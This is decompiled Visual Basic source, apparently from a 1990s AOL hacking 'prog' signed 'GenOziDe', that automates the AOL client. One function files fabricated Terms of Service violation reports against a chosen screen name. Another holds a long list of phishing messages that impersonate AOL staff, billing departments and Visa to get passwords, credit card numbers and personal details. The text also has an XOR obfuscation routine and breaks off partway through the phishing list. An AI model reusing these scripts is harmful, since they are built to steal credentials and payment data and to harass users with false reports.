l0D2C = LTrim(RTrim(Trim(l0D2C)))
l0D2C = Right$(l0D2C, Len(l0D2C) - InStr(l0D2C, ": "))
l0D2E = Left$(l0D2C, 24)
l0D2E = Right$(l0D2C, Len(l0D2C) - 1)
If InStr(l0D2E, "") <> 0 Then l0D2E = Left$(l0D2E, InStr(l0D2E, ""))
l0D34$ = l0D2E$
fn14B0 = l0D34$
End Function

Function fn14E8 (p0D3A As Integer) As Variant
Dim l0D3C As Integer
Dim l0D3E As Integer
Dim l0D40 As String
Dim l0D42 As Variant
Dim l0D46 As Integer
l0D3C% = extfn2EB8("AOL Frame25", 0&)
l0D3E% = extfn4D90(l0D3C%, "MDIClient")
l0D40$ = String$(255, 0)
l0D46% = extfn38C8(p0D3A, l0D42, 254, l0D40$)
l0D40$ = Trim$(l0D40$)
fn14E8 = l0D40$
End Function

Function fn1520 () As Variant
Dim l0D4C As Integer
Dim l0D4E As Variant
Dim l0D52 As Integer
Dim l0D54 As String
l0D4C% = extfn4D58(extfn2EB8("AOL Frame25", "America  Online"), "Welcome, ")
l0D4E = fn2B38(l0D4C%)
If l0D4C% <> 0 Then
    l0D52% = (InStr(l0D4E, "!") - 10)
    l0D54$ = Mid$(l0D4E, 10, l0D52%)
    fn1520 = l0D54$
Else
    fn1520 = "(unknown)"
End If
End Function

Function fn1558 () As Variant
Dim l0D5A As String
Dim l0D5C As Variant
l0D5A$ = String$(255, 0)
l0D5C = extfn2DA0(l0D5A$, 255)
If Right$(l0D5A$, 1) <> "\" Then l0D5A$ = l0D5A$ + "\"
fn1558 = l0D5A$
End Function

Function fn1590 (p0D64 As Variant, p0D68 As Variant) As Variant
Dim l0D6C As String
Dim l0D70 As Integer
    l0D6C = String$(255, 0)
    l0D70 = extfn3AF8(p0D64, p0D68, "", l0D6C, Len(l0D6C))
    If l0D70 = 0 Then
        fn1590 = "unknown"
    Else
        fn1590 = Left(l0D6C, l0D70)
    End If
End Function

Function fn15C8 (p0D74 As Integer) As String
Dim l0D76 As Variant
Dim l0D7A As String
Dim l0D7C As Variant
l0D76 = extfn4C78(p0D74, gc05CC, 0&, 0&)
l0D7A$ = Space$(l0D76)
l0D7C = extfn4CE8(p0D74, gc05D4, l0D76 + 1, l0D7A$)
fn15C8 = l0D7A$
End Function

Function fn1600 (p0D84 As Variant) As Variant
Dim l0D88 As Long
Dim l0D8A As Integer
    l0D88 = extfn39A8()
    l0D8A = CInt(l0D88 And &HFFFF&)
    p0D84 = Format$(l0D8A And &HFF) + "." + Format$(CInt(l0D8A / 256))
End Function

Function fn17C0 (p0DF0 As String) As Integer
Dim l0DF2 As Integer
On Error Resume Next
    l0DF2 = Len(Dir$(p0DF0))
    If Err Or l0DF2 = 0 Then
        fn17C0 = False
        Else
            fn17C0 = True
    End If
End Function

Function fn18D8 (p0E16 As String) As Variant
Dim l0E1C() As Integer
Dim l0E22 As Integer
Dim l0E24 As Integer
Dim l0E26 As Integer
Dim l0E28 As Variant
Dim l0E2C As Integer
Dim l0E2E As Integer
Dim l0E30 As Variant
Dim l0E34 As Variant
Dim l0E38 As Integer
Dim l0E3A As Variant
Dim l0E3E As Integer
Dim l0E40 As Integer
Dim l0E42 As Integer
Dim l0E44 As Integer
Dim l0E46 As Integer
Dim l0E48 As Integer
Dim l0E4A As Integer
Dim l0E4C As Integer
Dim l0E4E As Integer
Dim l0E50 As Integer
Dim l0E52 As Integer
Dim l0E54 As Integer
Dim l0E56 As Integer
Dim l0E58 As Integer
Dim l0E5A As Integer
Dim l0E5C As Variant
Dim l0E60 As Integer
Dim l0E62 As Integer
Dim l0E64 As Integer
Dim l0E66 As Integer
Dim l0E68 As Variant
If UCase$(p0E16$) Like UCase$("GenOziDe") Then
MsgBox "LoL Nice Try! Say goodbye to your main index!", 55, "Cant TOS GenOziDe!!"
Exit Function
End If
sub2400 "  "
sub27F0 .5
Do
l0E24% = extfn4D58(l0E22%, "Keyword")
sub27F0 .2
Loop Until l0E24% <> 0
l0E26% = extfn4D90(l0E24%, "_AOL_Edit")
l0E28 = extfn4CE8(l0E26%, gc05D6, 0, "KO Help")
l0E22% = extfn2EB8("AOL Frame25", 0&)
Do
DoEvents
l0E2C% = extfn4D58(l0E22%, "I Need Help!")
Loop Until l0E2C% <> 0
l0E30 = fn1088(l0E1C(), l0E2E%, "*", "_AOL_Icon", Null)
l0E34 = l0E1C(3)
l0E38% = extfn4CB0(l0E34, gc05C2, 0, 0&)
l0E38% = extfn4CB0(l0E34, gc05C4, 0, 0&)
Do
DoEvents
l0E2C% = extfn4D58(l0E22%, "Report A Violation")
Loop Until l0E2C% <> 0
l0E30 = fn1088(l0E1C(), l0E2E%, "*", "_AOL_Icon", Null)
l0E3A = l0E1C(2)
l0E38% = extfn4CB0(l0E3A, gc05C2, 0, 0&)
l0E38% = extfn4CB0(l0E3A, gc05C4, 0, 0&)
Do
DoEvents
l0E3E% = extfn4D58(l0E22%, "Violations via Instant Messages")
Loop Until l0E3E% <> 0
l0E40% = extfn4D58(l0E3E%, "Date")
l0E42% = extfn4C40(l0E40%, gc05CA)
l0E44% = extfn4CE8(l0E42%, gc05D6, 0, "" & Date)
l0E46% = extfn4D58(l0E3E%, "Category of Chat Room")
l0E48% = extfn4C40(l0E46%, gc05CA)
l0E4A% = extfn4CE8(l0E48%, gc05D6, 0, "Life")
l0E4C% = extfn4D58(l0E3E%, "Time AM/PM")
l0E4E% = extfn4C40(l0E4C%, gc05CA)
l0E50% = extfn4CE8(l0E4E%, gc05D6, 0, "" & Time)
l0E52% = extfn4D58(l0E3E%, "Chat Room Name")
l0E54% = extfn4C40(l0E52%, gc05CA)
l0E56% = extfn4CE8(l0E54%, gc05D6, 0, "Teen Chat5")
l0E58% = extfn4D58(l0E3E%, "CUT and PASTE a copy of the IM here")
l0E5A% = extfn4C40(l0E58%, gc05CA)
l0E60% = extfn4CE8(l0E5A%, gc05D6, 0, p0E16$ + ":" & " " + l0E5C & Chr(10))
l0E62% = extfn4D58(l0E3E%, "Send")
sub27F0 .1
l0E66% = extfn4D58(l0E64%, "SEND")
sub29E8
l0E68 = extfn4C78(l0E3E%, gc0024, 0, 0)
SendKeys "{f4}"
sub2400 "- – — IM Violation TOS complete — – -"
sub2400 "– — —– —— ÐeliriuM by GenOziDe —— –— — –"
Exit Function
End Function

Function fn1910 (p0E6E As Integer) As String
fn1910 = Str$(p0E6E)
End Function

Function fn1A60 (ByVal pv0EE0 As Variant, ByVal pv0EE4 As Variant, p0EE8 As Integer) As Variant
Dim l0EEA As String
Dim l0EEC As Variant
Dim l0EF0 As String
Dim l0EF2 As Integer
Dim l0EF4 As Variant
Dim l0EF8 As Variant
Dim l0EFC As Variant
Dim l0F00 As Variant
  On Error GoTo LD30E
  If Len(pv0EE0) = 0 Then Error 31100
  If Len(pv0EE0) > 255 Then Error 31100
  If Len(pv0EE4) = 0 Then Error 31100
  If p0EE8% = 0 Then
    l0EEA$ = Left$(pv0EE4, 4) + Right$(pv0EE4, 4)
    If l0EEA$ = Chr$(1) + "KT" + Chr$(1) + Chr$(1) + "KT" + Chr$(1) Then
      pv0EE4 = Mid$(pv0EE4, 5, Len(pv0EE4) - 8)
      l0EEC = 1
      Do
        l0EEC = InStr(l0EEC, pv0EE4, Chr$(1))
        If l0EEC = 0 Then
          Exit Do
        Else
          l0EF0$ = Chr$(Asc(Mid$(pv0EE4, l0EEC + 1)) - 1)
          pv0EE4 = Left$(pv0EE4, l0EEC - 1) + l0EF0$ + Mid$(pv0EE4, l0EEC + 2)
        End If
        l0EEC = l0EEC + 1
      Loop
      l0EF2% = False
    Else
      l0EF2% = True
    End If
  Else
    l0EF2% = True
  End If
  l0EF4 = 1
  l0EF8 = Len(pv0EE0)
  pv0EE0 = Chr$(Asc(Left$(pv0EE0, 1)) Xor l0EF8) + pv0EE0
  pv0EE0 = Chr$(Asc(Mid$(pv0EE0, 1, 1)) Xor Asc(Mid$(pv0EE0, 2, 1))) + pv0EE0
  pv0EE0 = pv0EE0 + Chr$(Asc(Right$(pv0EE0, 1)) Xor l0EF8)
  pv0EE0 = pv0EE0 + Chr$(Asc(Right$(pv0EE0, 2)) Xor Asc(Right$(pv0EE0, 1)))
  If l0EF2% = True Then
    pv0EE4 = Left$(pv0EE0, 3) + Format$(Asc(Right$(pv0EE0, 1)), "000") + Format$(Len(pv0EE0), "000") + pv0EE4
  End If
  For l0EFC = 1 To Len(pv0EE4)
    l0F00 = Asc(Mid$(pv0EE4, l0EFC, 1)) Xor Asc(Mid$(pv0EE0, l0EF4, 1))
    Mid$(pv0EE4, l0EFC, 1) = Chr$(l0F00)
    l0EF4 = l0EF4 + 1
    If l0EF4 > l0EF8 + 4 Then l0EF4 = 1
  Next l0EFC
  If l0EF2% = True Then
    l0EEC = 1
    Do
      l0EEC = InStr(l0EEC, pv0EE4, Chr$(1))
      If l0EEC > 0 Then
        pv0EE4 = Left$(pv0EE4, l0EEC - 1) + Chr$(1) + Chr$(2) + Mid$(pv0EE4, l0EEC + 1)
        l0EEC = l0EEC + 1
      End If
    Loop While l0EEC > 0
    Do
      l0EEC = InStr(pv0EE4, Chr$(0))
      If l0EEC > 0 Then pv0EE4 = Left$(pv0EE4, l0EEC - 1) + Chr$(1) + Chr$(1) + Mid$(pv0EE4, l0EEC + 1)
    Loop While l0EEC > 0
    Do
      l0EEC = InStr(pv0EE4, Chr$(10))
      If l0EEC > 0 Then pv0EE4 = Left$(pv0EE4, l0EEC - 1) + Chr$(1) + Chr$(11) + Mid$(pv0EE4, l0EEC + 1)
    Loop While l0EEC > 0
    Do
      l0EEC = InStr(pv0EE4, Chr$(13))
      If l0EEC > 0 Then pv0EE4 = Left$(pv0EE4, l0EEC - 1) + Chr$(1) + Chr$(14) + Mid$(pv0EE4, l0EEC + 1)
    Loop While l0EEC > 0
    Do
      l0EEC = InStr(pv0EE4, Chr$(26))
      If l0EEC > 0 Then pv0EE4 = Left$(pv0EE4, l0EEC - 1) + Chr$(1) + Chr$(27) + Mid$(pv0EE4, l0EEC + 1)
    Loop While l0EEC > 0
    pv0EE4 = Chr$(1) + "KT" + Chr$(1) + pv0EE4 + Chr$(1) + "KT" + Chr$(1)
  Else
    If Left$(pv0EE4, 9) <> Left$(pv0EE0, 3) + Format$(Asc(Right$(pv0EE0, 1)), "000") + Format$(Len(pv0EE0), "000") Then
      Error 31100
    Else
      pv0EE4 = Mid$(pv0EE4, 10)
    End If
  End If
  fn1A60 = pv0EE4
  Exit Function

LD30E:
  Exit Function
End Function

Function fn1A98 (p0F08 As Variant, p0F0C As Variant) As Variant
Dim l0F10 As String
Dim l0F12 As Variant
Dim l0F16 As String
Dim l0F18 As String
Dim l0F1A As Variant
Dim l0F1E As String
l0F10$ = p0F08
For l0F12 = 1 To Len(l0F10$)
l0F16$ = Mid(l0F10$, l0F12, 1)
l0F18$ = l0F18$ & l0F16$
If l0F16$ = Chr(13) Then
l0F1A = l0F1A + 1
l0F1E$ = Mid(l0F18$, 1, Len(l0F18$) - 1)
If p0F0C = l0F1A Then GoTo LD3FA
l0F18$ = ""
End If
Next l0F12
Exit Function
LD3FA:
l0F1E$ = fn2128(l0F1E$, Chr(13), "")
l0F1E$ = fn2128(l0F1E$, Chr(10), "")
fn1A98 = l0F1E$
End Function

Function fn1B78 (p0F42 As String, p0F44 As String) As String
Dim l0F46 As String
Dim l0F48 As Variant
Dim l0F4C As String
On Error GoTo LD6AA
Open p0F44$ For Input As #1
Do While Not EOF(1)
    Input #1, l0F46$
    If InStr(UCase$(l0F46$), UCase$(p0F42$)) Then
        l0F48 = InStr(UCase$(l0F46$), UCase$(p0F42$))
        l0F4C$ = Mid$(l0F46$, l0F48 + Len(p0F42$))
        fn1B78 = l0F4C$
    End If
Loop
LD6AA:
Close #1
Resume LD6C0
LD6C0:
End Function

Function fn1D00 (p1008 As Variant) As String
Dim l100C As Variant
Dim l1010 As Variant
Dim l1014 As Variant
     For l100C = 1 To Len(p1008)
          If Mid$(p1008, l100C, 1) = "&" Then
               l1010 = Mid$(p1008, 1, l100C - 1)
               l1014 = Mid$(p1008, l100C + 1, Len(p1008))
               p1008 = l1010 & l1014
          End If
          If InStr(p1008, "Ctrl") <> 0 Then
               p1008 = Mid$(p1008, 1, InStr(p1008, "Ctrl") - 1)
          End If
          If InStr(p1008, " Shift") Then
               p1008 = Mid$(p1008, 1, InStr(p1008, " Shift") - 1)
          End If
          If InStr(p1008, Chr$(9)) <> 0 Then
               p1008 = Mid$(p1008, 1, InStr(p1008, Chr$(9)) - 1)
          End If
     Next
     fn1D00 = p1008
End Function

Function fn1D38 () As Variant
Dim l101C As Variant
Dim l1020 As Variant
Dim l1024 As Integer
Dim l1026 As String
Dim l1028 As Variant
l101C = extfn2EB8%("AOL Frame25", "America  Online")
l1024% = extfn4D58%(l1020, "Welcome,")
l1026$ = fn15C8((l1024%))
If InStr(l1026$, "!") = 0 Then Exit Function
l1026$ = Left$(l1026$, InStr(l1026$, "!") - 1)
l1028 = Right$(l1026$, Len(l1026$) - InStr(l1026$, ",") - 1)
fn1D38 = l1028
End Function

Function fn1DE0 (p103C As Integer, p103E As Integer, p1040 As Integer) As Integer
Dim l1042 As Variant
l1042 = Int(p103C / p103E * p1040)
fn1DE0 = l1042
End Function

Function fn1EF8 (p10BE As TextBox) As Variant
Dim l10C0 As String
Dim l10C2 As Integer
Dim l10C4 As Integer
Dim l10C6 As String
Dim l10C8 As String
Let l10C0$ = p10BE
Let l10C2% = Len(l10C0$)
Do While l10C4% <= l10C2%
Let l10C4% = l10C4% + 1
Let l10C6$ = Mid$(l10C0$, l10C4%, 1)
Let l10C8$ = l10C6$ & l10C8$
Loop
fn1EF8 = l10C8$
End Function

Function fn1F30 (p10CE As String) As Variant
Dim l10D0 As String
Dim l10D2 As Integer
Dim l10D4 As Integer
Dim l10D6 As String
Dim l10D8 As String
Dim l10DA As String
Dim l10DC As Integer
Let l10D0$ = p10CE
Let l10D2% = Len(l10D0$)
Do While l10D4% <= l10D2%
DoEvents
Let l10D4% = l10D4% + 1
Let l10D6$ = Mid$(l10D0$, l10D4%, 1)
Let l10D8$ = Mid$(l10D0$, l10D4%, 2)
If l10D8$ = "ae" Then Let l10D8$ = "æ": Let l10DA$ = l10DA$ + l10D8$: Let l10DC% = 2: GoTo L15B70
If l10D8$ = "AE" Then Let l10D8$ = "Æ": Let l10DA$ = l10DA$ + l10D8$: Let l10DC% = 2: GoTo L15B70
If l10D8$ = "oe" Then Let l10D8$ = "œ": Let l10DA$ = l10DA$ + l10D8$: Let l10DC% = 2: GoTo L15B70
If l10D8$ = "OE" Then Let l10D8$ = "Œ": Let l10DA$ = l10DA$ + l10D8$: Let l10DC% = 2: GoTo L15B70
If l10DC% > 0 Then GoTo L15B70
If l10D6$ = "A" Then Let l10D6$ = "/\"
If l10D6$ = "a" Then Let l10D6$ = "å"
If l10D6$ = "B" Then Let l10D6$ = "ß"
If l10D6$ = "C" Then Let l10D6$ = "Ç"
If l10D6$ = "c" Then Let l10D6$ = "¢"
If l10D6$ = "D" Then Let l10D6$ = "Ð"
If l10D6$ = "d" Then Let l10D6$ = "ð"
If l10D6$ = "E" Then Let l10D6$ = "Ê"
If l10D6$ = "e" Then Let l10D6$ = "è"
If l10D6$ = "f" Then Let l10D6$ = "ƒ"
If l10D6$ = "H" Then Let l10D6$ = "|-|"
If l10D6$ = "I" Then Let l10D6$ = "‡"
If l10D6$ = "i" Then Let l10D6$ = "î"
If l10D6$ = "k" Then Let l10D6$ = "|‹"
If l10D6$ = "L" Then Let l10D6$ = "£"
If l10D6$ = "M" Then Let l10D6$ = "|V|"
If l10D6$ = "m" Then Let l10D6$ = "^^"
If l10D6$ = "N" Then Let l10D6$ = "/\/"
If l10D6$ = "n" Then Let l10D6$ = "ñ"
If l10D6$ = "O" Then Let l10D6$ = "Ø"
If l10D6$ = "o" Then Let l10D6$ = "º"
If l10D6$ = "P" Then Let l10D6$ = "¶"
If l10D6$ = "p" Then Let l10D6$ = "Þ"
If l10D6$ = "r" Then Let l10D6$ = "®"
If l10D6$ = "S" Then Let l10D6$ = "§"
If l10D6$ = "s" Then Let l10D6$ = "$"
If l10D6$ = "t" Then Let l10D6$ = "†"
If l10D6$ = "U" Then Let l10D6$ = "Ú"
If l10D6$ = "u" Then Let l10D6$ = "µ"
If l10D6$ = "V" Then Let l10D6$ = "\/"
If l10D6$ = "W" Then Let l10D6$ = "VV"
If l10D6$ = "w" Then Let l10D6$ = "vv"
If l10D6$ = "X" Then Let l10D6$ = "X"
If l10D6$ = "x" Then Let l10D6$ = "×"
If l10D6$ = "Y" Then Let l10D6$ = "¥"
If l10D6$ = "y" Then Let l10D6$ = "ý"
If l10D6$ = "!" Then Let l10D6$ = "¡"
If l10D6$ = "?" Then Let l10D6$ = "¿"
If l10D6$ = "." Then Let l10D6$ = "…"
If l10D6$ = "," Then Let l10D6$ = "‚"
If l10D6$ = "1" Then Let l10D6$ = "¹"
If l10D6$ = "%" Then Let l10D6$ = "‰"
If l10D6$ = "2" Then Let l10D6$ = "²"
If l10D6$ = "3" Then Let l10D6$ = "³"
If l10D6$ = "_" Then Let l10D6$ = "¯"
If l10D6$ = "-" Then Let l10D6$ = "—"
If l10D6$ = " " Then Let l10D6$ = " "
Let l10DA$ = l10DA$ + l10D6$

L15B70:
If l10DC% > 0 Then Let l10DC% = l10DC% - 1
DoEvents
Loop
fn1F30 = l10DA$
End Function

Function fn1F68 (p10E4 As TextBox) As Variant
Dim l10E6 As String
Dim l10E8 As Integer
Dim l10EA As Integer
Dim l10EC As String
Dim l10EE As String
Let l10E6$ = p10E4
Let l10E8% = Len(l10E6$)
Do While l10EA% <= l10E8%
Let l10EA% = l10EA% + 1
Let l10EC$ = Mid$(l10E6$, l10EA%, 1)
If l10EC$ = "A" Then Let l10EC$ = "a"
If l10EC$ = "E" Then Let l10EC$ = "e"
If l10EC$ = "I" Then Let l10EC$ = "i"
If l10EC$ = "O" Then Let l10EC$ = "o"
If l10EC$ = "U" Then Let l10EC$ = "u"
If l10EC$ = "b" Then Let l10EC$ = "B"
If l10EC$ = "c" Then Let l10EC$ = "C"
If l10EC$ = "d" Then Let l10EC$ = "D"
If l10EC$ = "z" Then Let l10EC$ = "Z"
If l10EC$ = "f" Then Let l10EC$ = "F"
If l10EC$ = "g" Then Let l10EC$ = "G"
If l10EC$ = "h" Then Let l10EC$ = "H"
If l10EC$ = "y" Then Let l10EC$ = "Y"
If l10EC$ = "j" Then Let l10EC$ = "J"
If l10EC$ = "k" Then Let l10EC$ = "K"
If l10EC$ = "l" Then Let l10EC$ = "L"
If l10EC$ = "m" Then Let l10EC$ = "M"
If l10EC$ = "n" Then Let l10EC$ = "N"
If l10EC$ = "x" Then Let l10EC$ = "X"
If l10EC$ = "p" Then Let l10EC$ = "P"
If l10EC$ = "q" Then Let l10EC$ = "Q"
If l10EC$ = "r" Then Let l10EC$ = "R"
If l10EC$ = "s" Then Let l10EC$ = "S"
If l10EC$ = "t" Then Let l10EC$ = "T"
If l10EC$ = "w" Then Let l10EC$ = "W"
If l10EC$ = "v" Then Let l10EC$ = "V"
If l10EC$ = " " Then Let l10EC$ = " "
Let l10EE$ = l10EE$ + l10EC$
Loop
fn1F68 = l10EE$
End Function

Function fn1FA0 (p10F4 As String) As Variant
Let fn1FA0 = Trim(p10F4)
End Function

Function fn1FD8 (p10FC As TextBox) As Variant
Dim l10FE As String
Dim l1100 As Integer
Dim l1102 As Integer
Dim l1104 As String
Dim l1106 As String
Let l10FE$ = p10FC
Let l1100% = Len(l10FE$)
Do While l1102% <= l1100%
Let l1102% = l1102% + 1
Let l1104$ = Mid$(l10FE$, l1102%, 1)
Let l1104$ = l1104$ + " "
Let l1106$ = l1106$ + l1104$
Loop
fn1FD8 = l1106$
End Function

Function fn2010 (p110C As Variant) As Variant
Randomize
fn2010 = Int((Val(p110C) * Rnd) + 1)
End Function

Function fn2048 (p1114 As String) As Variant
Dim l1116 As String
Dim l1118 As String
Dim l111A As String
Do
l1116$ = Left$(p1114$, 1)
If UCase$(l1116$) = l1116$ Then
l1118$ = LCase$(l1116$)
Else l1118$ = UCase$(l1116$)
End If
l111A$ = l111A$ & l1118$
p1114$ = Mid$(p1114$, 2)
DoEvents
Loop Until Len(p1114$) = 0
fn2048 = l111A$
End Function

Function fn2080 (p111E As Variant, p1122 As Variant, p1126 As String) As String
Dim l1128 As String
    l1128 = String(255, Chr(0))
    fn2080 = Left(l1128, extfn3A88(p111E, ByVal p1122, "", l1128, Len(l1128), p1126))
End Function

Function fn2128 (p1142 As Variant, p1146 As Variant, p114A As Variant) As Variant
Dim l114E As Variant
Dim l1152 As String
Dim l1154 As String
If InStr(p1142, p1146) = 0 Then
fn2128 = p1142
Exit Function
End If
For l114E = 1 To Len(p1142)
l1152$ = Mid(p1142, l114E, 1)
l1154$ = l1154$ & l1152$
If l1152$ = p1146 Then
l1154$ = Mid(l1154$, 1, Len(l1154$) - 1) + p114A
End If
Next l114E
fn2128 = l1154$
End Function

Function fn218 () As Variant
Dim l06EC As Integer
fn218 = l06EC
End Function

Function fn21D0 (pADD4 As Integer, pADD6 As Integer) As Variant
Dim lADD8 As Variant
Dim lADE0 As Variant
Dim lADE4 As Variant
Dim lADE8 As Integer
Dim lADEE As String * 500
Dim lADF0 As Variant
Dim lADF4 As Variant
Dim lADF8 As Variant
lADE4 = extfn2EB8("ThunderMain", 0&)
lADF0 = extfn4D90(lADE4, "wndclass_desked_gsk")
lADF4 = extfn2CC0(lADE4)
lADF8 = extfn4B28(lADF4, 0, lADEE, Len(lADEE) + 1, &H400)
If InStr(lADEE, "*") Then pADD4 = pADD4 + 1
lADE0 = extfn4BD0%(lADF4, pADD4)
lADE8 = extfn4B98%(lADE0, pADD6)
lADD8 = extfn4CB0(lADE4, &H111, lADE8, 0)
End Function

Function fn2208 (p) As Variant
End Function

Function fn2240 (pAE20 As Integer, pAE22 As Integer) As Variant
Dim lAE24 As Variant
Dim lAE28 As Variant
Dim lAE2C As Variant
Dim lAE30 As Integer
Dim lAE32 As Long
Static mAE34 As Integer
lAE28 = extfn2CC0%(extfn2EB8(0&, "America  Online"))
lAE2C = extfn4BD0%(lAE28, pAE20)
lAE30 = extfn4B98%(lAE2C, pAE22)
lAE32 = CLng(0) * &H10000 Or mAE34
lAE24 = extfn4CB0(extfn2EB8(0&, "America  Online"), gc05D0, lAE30, 0&)
End Function

Function fn2470 (pAEF0 As Variant) As Variant
Dim lAEF4 As Integer
lAEF4% = extfn4B60(pAEF0)
End Function

Function fn250 () As Variant
Dim l06F2 As Integer
l06F2% = extfn2EB8("AOL Frame25", 0&)
End Function

Function fn25F8 () As Variant
Dim lAF4C As Integer
Dim lAF4E As Integer
Dim lAF50 As Integer
Dim lAF52 As Integer
lAF4C% = extfn2EB8("AOL Frame25", 0&)
If lAF4C% = 0 Then
    fn25F8 = 0
    Exit Function
End If
lAF4E% = extfn4D90(lAF4C%, "MDIClient")
lAF50% = extfn4D58(lAF4E%, "Welcome, ")
If lAF50% = 0 Then
    fn25F8 = 0
    Exit Function
End If
lAF52% = extfn4D90(lAF50%, "_AOL_Combobox")
If lAF52% <> 0 Then
    fn25F8 = 0
    Exit Function
End If
fn25F8 = 2
End Function

Function fn26A0 () As Variant
Dim lAF88 As Integer
Dim lAF8A As Integer
Dim lAF8C As Integer
Dim lAF8E As Integer
Dim lAF90 As Integer
Dim lAF92 As Integer
Dim lAF94 As Integer
lAF88% = extfn2EB8("_AOL_Modal", 0&)
lAF8A% = extfn4D90(lAF88%, "_AOL_Button")
lAF8C% = extfn4D58(lAF88%, "Yes")
If lAF8C% <> 0 Then
sub9F8 lAF8C%
End If
lAF8E% = extfn2EB8("aol Frame25", 0&)
lAF90% = extfn4D90(lAF8E%, "_AOL_Palette")
lAF92% = extfn4D90(lAF90%, "_AOL_Button")
lAF94% = extfn4D58(lAF90%, "OK")
If lAF90% <> 0 Then
sub9F8 lAF94%
End If
End Function

Function fn2780 (pAFB2 As String) As String
Dim lAFB4 As Integer
    lAFB4 = InStr(pAFB2, Chr$(0))
    If lAFB4 > 0 Then
        fn2780 = Left$(pAFB2, lAFB4 - 1)
    Else
        fn2780 = pAFB2
    End If
End Function

Function fn2860 () As String
Dim lAFE0 As Variant
Dim lAFE4 As Variant
Randomize
lAFE0 = Int((Val("141") * Rnd) + 1)
If lAFE0 = "1" Then
lAFE0 = "Hi, I'm with AOL's Online Security. We have found hackers trying to get into your MailBox. Please verify your password immediately to avoid account termination.     Thank you.                                    AOL Staff"
ElseIf lAFE0 = "2" Then
lAFE0 = "Hello. I am with AOL's billing department. Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. Thank you, and continue to enjoy America Online."
ElseIf lAFE0 = "3" Then
lAFE0 = "Good Evening. I am with AOL's Virus Protection Group. Due to some evidence of virus uploading, I must validate your sign-on password. Please STOP what you're doing and Tell me your password.       -- AOL VPG"
ElseIf lAFE0 = "4" Then
lAFE0 = "Hello, I am the Head Of AOL's XPI Link Department. Due to a configuration error in your version of AOL, I need you to verify your log-on password to me, to prevent account suspension and possible termination.  Thank You."
ElseIf lAFE0 = "5" Then
lAFE0 = "Hi. You are speaking with AOL's billing manager, Steve Case. Due to a virus in one of our servers, I am required to validate your password. You will be awarded an extra 10 FREE hours of air-time for the inconvenience."
ElseIf lAFE0 = "6" Then
lAFE0 = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf lAFE0 = "7" Then
lAFE0 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf lAFE0 = "8" Then
lAFE0 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf lAFE0 = "9" Then
lAFE0 = "Hi, I'm Alex Troph of America Online Sevice Department. Your online account, #3560028, is displaying a billing error. We need you to respond back with your name, address, card number, expiration date, and daytime phone number. Sorry for this inconvenience."
ElseIf lAFE0 = "10" Then
lAFE0 = "Hello, I am a representative of the VISA Corp.  Due to a computer error, we are unable complete your membership to America Online. In order to correct this problem, we ask that you hit the `Respond` key, and reply with your full name and password, so that the proper changes can be made to avoid cancellation of your account. Thank you for your time and cooperation.  :-)"
ElseIf lAFE0 = "11" Then
lAFE0 = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records. Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again. Thank you.  :-)"
ElseIf lAFE0 = "12" Then
lAFE0 = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Telephone#, Visa Card#, and Expiration date. If this information is not processed promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
ElseIf lAFE0 = "13" Then
lAFE0 = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that your validation process is almost complete.  To complete your validation process I need you to please hit the `Respond` key and reply with the following information: Name, Address, Phone Number, City, State, Zip Code,  Credit Card Number, Expiration Date, and Bank Name.  Thank you for your time and cooperation and we hope that you enjoy America Online. :-)"
ElseIf lAFE0 = "14" Then
lAFE0 = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
ElseIf lAFE0 = "15" Then
lAFE0 = "Hello, this is the America Online Billing Department.  Due to a System Crash, we have lost your billing information.  Please hit respond, then enter your Credit Card Number, and experation date.  Thank You, and sorry for the inconvience."
ElseIf lAFE0 = "16" Then
lAFE0 = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
ElseIf lAFE0 = "17" Then
lAFE0 = "Sorry, there seems to be a problem with your bill. Please reply with your password to verify that you are the account holder.  Thank you."
ElseIf lAFE0 = "18" Then
lAFE0 = "Sorry  the credit card you entered is invalid. Perhaps you mistyped it?  Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it. Thank you and enjoy AOL."
ElseIf lAFE0 = "19" Then
lAFE0 = "Sorry, your credit card failed authorization. Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it.  Thank you and enjoy AOL."
ElseIf lAFE0 = "20" Then
lAFE0 = "Due to the numerous use of identical passwords of AOL members, we are now generating new passwords with our computers.  Your new password is 'Stryf331', You have the choice of the new or old password.  Click respond and try in your preferred password.  Thank you"
ElseIf lAFE0 = "21" Then
lAFE0 = "I work for AOL's Credit Card department. My job is to check EVERY AOL account for credit accuracy.  When I got to your account, I am sorry to say, that the Credit information is now invalid. We DID have a sysem crash, which my have lost the information, please click respond and type your VALID credit card info.  Card number, names, exp date, etc, Thank you!"
ElseIf lAFE0 = "22" Then
lAFE0 = "Hello I am with AOL Account Defense Department.  We have found that your account has been dialed from San Antonia,Texas. If you have not used it there, then someone has been using your account.  I must ask for your password so I can change it and catch him using the old one.  Thank you."
ElseIf lAFE0 = "23" Then
